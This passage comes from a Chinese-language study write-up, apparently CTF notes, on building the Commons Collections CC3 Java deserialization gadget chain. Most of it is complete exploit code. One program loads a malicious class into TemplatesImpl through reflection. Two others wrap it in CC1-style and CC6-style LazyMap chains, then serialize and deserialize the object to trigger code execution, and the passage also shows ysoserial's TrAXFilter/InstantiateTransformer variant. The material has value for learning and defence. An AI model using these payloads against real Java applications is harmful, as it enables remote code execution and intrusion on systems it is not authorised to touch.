src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671196666101-36ee3a7e-0a61-4c2c-a357-400e2c561b12.png#averageHue=%232d2d2c&clientId=udbbfbc4e-b37b-4&from=paste&height=121&id=u5915cb6f&name=image.png&originHeight=151&originWidth=800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15024&status=done&style=none&taskId=u810f8385-1667-49fb-b0b7-86ef22ca685&title=&width=640" alt="image.png"><br>在readObject方法里被赋值了，因此不必担心<br>继续跟进看看谁调用了<code>defineTransletClasses</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671196909786-33400413-5941-4563-8058-a9c53a26de34.png#averageHue=%234d5c4d&clientId=udbbfbc4e-b37b-4&from=paste&height=275&id=u97621a80&name=image.png&originHeight=344&originWidth=1652&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105388&status=done&style=none&taskId=u1fcdfbcc-450c-4cb5-96c1-d0468a5ab66&title=&width=1321.6" alt="image.png"><br>重心放在<code>getTransletInstance()</code>方法上，虽然有3个结果，但是只有这个方法调用了<code>.newInstance()</code>方法，这样我们才有可能实例化恶意类<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671196964771-f615ed94-6074-4aa9-8674-85ecec6a73dd.png#averageHue=%232d2c2c&clientId=udbbfbc4e-b37b-4&from=paste&height=158&id=u2426495b&name=image.png&originHeight=198&originWidth=993&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22639&status=done&style=none&taskId=u172eb438-413b-4469-a426-191f48956eb&title=&width=794.4" alt="image.png"><br>有一个判断，如果<code>_name</code>属性为空，就<code>return null</code>，这肯定是不行的，因此需要反射赋值<br>继续跟进看看谁调用了<code>getTransletInstance()</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671197026307-73ab23dc-bfc6-425e-a91e-80355b9176a2.png#averageHue=%23465848&clientId=udbbfbc4e-b37b-4&from=paste&height=210&id=u03ed78a6&name=image.png&originHeight=262&originWidth=1775&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55781&status=done&style=none&taskId=u65fba5de-f1f5-4c45-aa9c-dda9e8480e5&title=&width=1420" alt="image.png"><br>唯一一个结果newTransformer调用：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671197107712-25ec928a-3785-4992-9e0b-55294ad25f6d.png#averageHue=%232e2b2b&clientId=udbbfbc4e-b37b-4&from=paste&height=283&id=u845c5183&name=image.png&originHeight=354&originWidth=1136&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42926&status=done&style=none&taskId=u9d2535be-0ecb-4ee0-8507-7626f7e6f14&title=&width=908.8" alt="image.png"><br>在此处调用了getTransletInstance方法，因此我们的思路就确定了，实例化一个TemplatesImpl对象，然后调用newTransformer方法，这样就可以加载恶意类：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671197889086-a01c719c-3475-4e67-b208-9bdce45fdf03.png#averageHue=%232d2d2c&clientId=udbbfbc4e-b37b-4&from=paste&height=168&id=u099eebf9&name=image.png&originHeight=210&originWidth=1017&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24592&status=done&style=none&taskId=ue6efa246-d41c-4582-bab1-483f9d8e956&title=&width=813.6" alt="image.png"><br>思路雏形如上，目的就是这样调用，但是需要反射修改上述说的那几个参数，要不然if语句无法通过，对雏形进行进一步完善：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class c= TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;Boogipop&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\\\CTF学习笔记\\\\Java\\\\CC1-NEW\\\\target\\\\classes\\\\EXEC.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        <span class="comment">//由于还没进行反序列化，所以手动给_tfactory赋值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671199189696-91b57bdd-f8ff-4bf8-bd1a-0f9ddb67e8d8.png#averageHue=%232c2c2c&clientId=udbbfbc4e-b37b-4&from=paste&height=122&id=u2b1c3c32&name=image.png&originHeight=152&originWidth=842&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17682&status=done&style=none&taskId=u79992e2e-bce1-480a-ade2-de2ed93aa4c&title=&width=673.6" alt="image.png"><br>但是会抛出一个空指针异常：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671199232122-7918a0fb-915e-47d9-bac4-4840db720f0d.png#averageHue=%239d674e&clientId=udbbfbc4e-b37b-4&from=paste&height=349&id=uf919d54c&name=image.png&originHeight=436&originWidth=1854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=113474&status=done&style=none&taskId=u9bdb1d39-5a6c-467b-8282-92a91f6eaa2&title=&width=1483.2" alt="image.png"><br>下断点调试：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671199275266-47d3b820-d7ea-4320-a17e-498978e29033.png#averageHue=%232e2c2b&clientId=udbbfbc4e-b37b-4&from=paste&height=328&id=ue20df07b&name=image.png&originHeight=410&originWidth=1399&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72802&status=done&style=none&taskId=ua75e59e1-abca-462e-ad05-f4d7abdd61c&title=&width=1119.2" alt="image.png"><br>在这里的_transletIndex属性是-1，因此上方抛出了空指针异常<br><code>superClass.getName().equals(ABSTRACT_TRANSLET)</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671199391630-07094a44-ee0c-4921-9ee0-b7baf41fcb49.png#averageHue=%232f2e2d&clientId=udbbfbc4e-b37b-4&from=paste&height=73&id=ub00c2b4d&name=image.png&originHeight=91&originWidth=1150&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24781&status=done&style=none&taskId=u9d178792-4005-4520-a7b3-56c5489697c&title=&width=920" alt="image.png"><br>superClass就是我们恶意类，他的父类需要为<code>ABSTRACT_TRANSLET</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671199458524-2dc32354-954c-46f8-9fb4-f19948400192.png#averageHue=%232d2d2c&clientId=udbbfbc4e-b37b-4&from=paste&height=91&id=u7145a08a&name=image.png&originHeight=114&originWidth=897&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12419&status=done&style=none&taskId=u50ab4999-f980-4ced-9798-e97418f1d92&title=&width=717.6" alt="image.png"><br>也就是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code><br>我们让恶意类继承一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671199497265-919ea4ca-edc7-40dd-9a9e-fb56e9f2efef.png#averageHue=%232c2c2b&clientId=udbbfbc4e-b37b-4&from=paste&height=246&id=u7009658f&name=image.png&originHeight=307&originWidth=1129&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48769&status=done&style=none&taskId=u4ffa2c40-c35b-4d1e-9425-20e1c3cf0b2&title=&width=903.2" alt="image.png"><br>接着再运行一次看看：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671199820559-95ed0f7a-9123-466f-ae48-79c2d68d6352.png#averageHue=%233b3a3a&clientId=udbbfbc4e-b37b-4&from=paste&height=458&id=u75a40372&name=image.png&originHeight=572&originWidth=1418&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76733&status=done&style=none&taskId=uf37b65b5-d104-4fed-95c5-5979ef1e87a&title=&width=1134.4" alt="image.png"><br>成功运行了，然后现在需要做的也就是怎么把<code>templates.newTransformer();</code>和cc1,cc6这样包装起来，我们同样可以仿照一下，然后将刚刚写的和CC1后半结合：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class c= TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;Boogipop&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\\\CTF学习笔记\\\\Java\\\\CC1-NEW\\\\target\\\\classes\\\\EXEC.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        <span class="comment">//由于还没进行反序列化，所以手动给_tfactory赋值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//CC1后半</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c2.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) annotationconstructor.newInstance(Override.class,lazymap);</span><br><span class="line">        <span class="comment">//生成动态代理</span></span><br><span class="line">        Map mapproxy= (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        <span class="comment">//生成最外层</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationconstructor.newInstance(Override.class, mapproxy);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到了一条CC3的链<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671200185427-3279100b-40d0-4c93-803f-18330866a817.png#averageHue=%23444341&clientId=udbbfbc4e-b37b-4&from=paste&height=382&id=u0c336378&name=image.png&originHeight=478&originWidth=1180&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88544&status=done&style=none&taskId=u390a0291-4e27-4ff5-978a-5248f1b241c&title=&width=944" alt="image.png"><br>我们这是调用了CC1的后半链，那CC6的可不可以呢？显然可以啊！</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3TEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class c= TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;Boogipop&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\\\CTF学习笔记\\\\Java\\\\CC1-NEW\\\\target\\\\classes\\\\EXEC.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        <span class="comment">//由于还没进行反序列化，所以手动给_tfactory赋值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//CC6后半</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//随便改成什么Transformer</span></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671200265685-92b13bd1-2a9a-41f3-999b-adbe7775904b.png#averageHue=%233e3d3d&clientId=udbbfbc4e-b37b-4&from=paste&height=421&id=u500b01dc&name=image.png&originHeight=526&originWidth=1325&originalType=binary&ratio=1&rotation=0&showTitle=false&size=94033&status=done&style=none&taskId=uf27a924f-0d3d-4379-903c-4f42415a4f1&title=&width=1060" alt="image.png"><br>但是对比分析Ysoserial还是有些不同：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671201547073-36a36d0c-f9c6-4393-ba32-eb4d018903e7.png#averageHue=%23fefefd&clientId=udbbfbc4e-b37b-4&from=paste&height=349&id=u85f63a7e&name=image.png&originHeight=436&originWidth=1300&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43311&status=done&style=none&taskId=ua90a63a3-d806-437d-a8e1-44502b0699e&title=&width=1040" alt="image.png"><br>在chainedtransformer里的参数就不同了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">						<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">						<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templatesImpl &#125; )&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>他并未调用<code>InvokerTransformer</code>而是调用了<code>InstantiateTransformer</code>，我们也可以分析一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671208251822-7415d448-1eaf-46af-b6e3-2b15dca4e536.png#averageHue=%232c2c2b&clientId=udbbfbc4e-b37b-4&from=paste&height=206&id=u2d8c9f31&name=image.png&originHeight=257&originWidth=1247&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29897&status=done&style=none&taskId=ue160bcbe-5bca-4730-be86-734957379ac&title=&width=997.6" alt="image.png"><br>看看就知道这其实就是InvokerTransformer的替代品，作用都一模一样，只不过这个是调用构造函数的，那再看看Ysoserial里的<code>TrAXFilter</code>类：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671208304372-cf8c8afe-252a-42fd-95ea-90ce5444a5eb.png#averageHue=%232c2b2b&clientId=udbbfbc4e-b37b-4&from=paste&height=214&id=u2372fb22&name=image.png&originHeight=267&originWidth=944&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36330&status=done&style=none&taskId=uaaebbc70-a240-409a-8c3b-5d8f4f43441&title=&width=755.2" alt="image.png"><br>在它的构造函数中恰巧就调用了我们最终需要的newTransformer方法，因此可以构造CC3：</p>
